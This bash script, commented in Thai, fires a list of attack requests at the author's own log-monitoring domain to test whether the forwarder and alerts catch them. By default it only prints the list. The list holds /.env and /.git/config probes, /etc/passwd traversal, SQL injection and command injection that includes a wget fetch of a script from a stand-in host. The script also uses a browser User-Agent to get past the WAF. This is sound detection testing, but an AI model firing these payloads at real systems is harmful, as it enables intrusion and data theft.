#!/usr/bin/env bash
# Demo: ยิง request โจมตีจากเครื่อง "ภายนอก" (เช่น Kali) ผ่านโดเมนจริงเข้า https-proxy ของ CT141
# เพื่อให้ forwarder (web-proxy) จับเป็น WARNING → detection ออก alert → เห็น batch/anchor จริง
#
# ใช้:  ./demo-external-attack.sh [BASE_URL]
#       BASE_URL ปริยาย = https://logchain.nareubad.work  (ตั้ง HOST อื่นได้: HOST=logchain-api.nareubad.work)
#
# สำคัญ:
#   - รันจากเครื่องนอก VPN (ให้ IP ต้นทางเป็น IP จริง ไม่ใช่ 10.10.x.x ที่ forwarder ตัดทิ้งเป็น internal)
#   - อย่ารันจาก CT141 เอง: IP ขาออก 49.48.73.182 อยู่ใน EXCLUDE_IPS จะไม่ถูกส่ง
#   - UA เป็นเบราว์เซอร์ธรรมดา: ถ้าใช้ sqlmap/nikto ตรง ๆ Cloudflare WAF บล็อกก่อนถึง origin (ไม่ได้ทดสอบ pipeline เรา)
#   - forwarder ต้องเปิดอยู่ (systemctl enable --now logchain-forwarder) ถึงจะมี log เข้า API
#
# DRY RUN โดยปริยาย — พิมพ์ว่าจะยิงอะไร ไม่ยิงจริง · ยิงจริงต้องตั้ง  FIRE=1
set -euo pipefail

BASE="${1:-${BASE_URL:-https://logchain.nareubad.work}}"
HOST_HDR="${HOST:-}"                       # ถ้าอยากบังคับ Host header (เช่นยิง IP ตรง ๆ)
UA="${UA:-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36}"
FIRE="${FIRE:-0}"
SLEEP="${SLEEP:-1}"

# ชื่อ | path | เหตุผลที่ forwarder ควรจับ (ตรงกับ _suspicious ใน forwarder/logchain_forwarder/parsers.py)
#   - probe-path ส่งเฉพาะเมื่อ status >= 400 (ถ้า Cloudflare/origin ตอบ 200 จะไม่ถูกจับ)
#   - traversal / sqli / shell-meta จับจาก path ไม่ขึ้นกับ status
ATTACKS=(
  "dotenv|/.env|probe-path (ต้อง 4xx/5xx)"
  "git-config|/.git/config|probe-path (ต้อง 4xx/5xx)"
  "wp-login|/wp-login.php|probe-path (ต้อง 4xx/5xx)"
  "wp-admin|/wp-admin/setup-config.php|probe-path (ต้อง 4xx/5xx)"
  "traversal|/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd|traversal (ไม่ขึ้นกับ status)"
  "traversal-raw|/../../../../etc/passwd|traversal"
  "sqli-encoded|/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--|sqli (URL-decode)"
  "sqli-plus|/item?id=1+OR+1=1|sqli"
  "cmdi-wget|/ping?host=8.8.8.8;wget%20http://example.invalid/x.sh|shell-meta (URL-decode)"
  "cmdi-subshell|/run?cmd=\$(id)|shell-meta"
)

echo "เป้าหมาย : $BASE"
[ -n "$HOST_HDR" ] && echo "Host     : $HOST_HDR"
echo "UA       : $UA"
echo "โหมด     : $([ "$FIRE" = 1 ] && echo 'ยิงจริง (FIRE=1)' || echo 'DRY RUN — ไม่ยิง (ตั้ง FIRE=1 เพื่อยิงจริง)')"
echo "จำนวน    : ${#ATTACKS[@]} request"
echo

if [ "$FIRE" != 1 ]; then
  printf '%-16s %-55s %s\n' "ชื่อ" "path" "เหตุผล"
  for a in "${ATTACKS[@]}"; do
    IFS='|' read -r name path reason <<<"$a"
    printf '%-16s %-55s %s\n' "$name" "$path" "$reason"
  done
  echo
  echo "ยังไม่ยิง · ตรวจก่อนว่า forwarder เปิดแล้ว (systemctl status logchain-forwarder) แล้วรันซ้ำด้วย FIRE=1"
  exit 0
fi

# ยิงจริง: รายงาน status + เดาว่าโดน Cloudflare บล็อกไหม (403/503 + Server: cloudflare หรือ cf-mitigated/cf-ray)
host_args=(); [ -n "$HOST_HDR" ] && host_args=(-H "Host: $HOST_HDR")
printf '%-16s %-7s %-10s %s\n' "ชื่อ" "status" "ชั้นที่ตอบ" "หมายเหตุ"
for a in "${ATTACKS[@]}"; do
  IFS='|' read -r name path _ <<<"$a"
  HDRS=$(mktemp)
  code=$(curl -sS -o /dev/null -D "$HDRS" -w '%{http_code}' \
           -A "$UA" "${host_args[@]}" \
           --max-time 15 "$BASE$path" 2>/dev/null || echo "000")
  server=$(grep -i '^server:' "$HDRS" | head -1 | tr -d '\r' | awk '{print tolower($2)}')
  cf_ray=$(grep -ic '^cf-ray:' "$HDRS" || true)
  cf_mit=$(grep -ic '^cf-mitigated:' "$HDRS" || true)
  rm -f "$HDRS"
  if { [ "$code" = 403 ] || [ "$code" = 503 ] || [ "$code" = 429 ]; } && { [ "$server" = cloudflare ] || [ "$cf_mit" -gt 0 ]; }; then
    layer="Cloudflare"; note="น่าจะถูก WAF บล็อก — ไม่ถึง origin → ไม่มี log"
  elif [ "$code" = 000 ]; then
    layer="-"; note="ต่อไม่ติด/timeout"
  elif [ "$cf_ray" -gt 0 ]; then
    layer="origin"; note="ผ่าน Cloudflare ถึง origin → forwarder ควรจับเป็น WARNING"
  else
    layer="?"; note="ไม่มี cf-ray — อาจยิงตรง origin ไม่ผ่าน Cloudflare"
  fi
  printf '%-16s %-7s %-10s %s\n' "$name" "$code" "$layer" "$note"
  sleep "$SLEEP"
done
echo
echo "ถ้าผ่านถึง origin: เปิดหน้า Logs (source=web-proxy, severity=WARNING) และ Alerts ดู RULE_MATCH"
echo "ชุด sqli/cmdi/traversal ที่ถึง origin จะเข้า rule 31100 / 31151 / 60002 · probe path เข้า 60001"
